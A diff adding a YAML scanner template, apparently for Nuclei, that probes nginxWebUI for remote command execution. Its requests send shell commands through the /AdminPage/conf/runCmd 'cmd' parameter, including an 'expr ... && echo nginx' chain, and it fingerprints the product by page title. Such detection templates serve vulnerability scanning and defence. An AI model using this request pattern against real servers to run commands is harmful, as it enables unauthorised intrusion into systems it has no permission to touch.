@@ -1,0 +1,45 @@
+id: poc-yaml-nginxwebui-rce
+
+info:
+  name: poc-yaml-nginxwebui-rce
+  author: chaitin
+  severity: medium
+  tags: xray-converted,rce
+  reference:
+    - https://stack.chaitin.com/techblog/detail?id=118
+
+http:
+  - raw:
+      - |
+        GET /AdminPage/conf/runCmd?cmd=expr%20{{rand_int(1000, 9999)}}%20-%20{{rand_int(1000, 9999)}}%26%26echo%20nginx HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /AdminPage/conf/runCmd?cmd=echo%20{{rand_base(8)}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /aDminPage/about HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<title>nginxWebUI</title>"
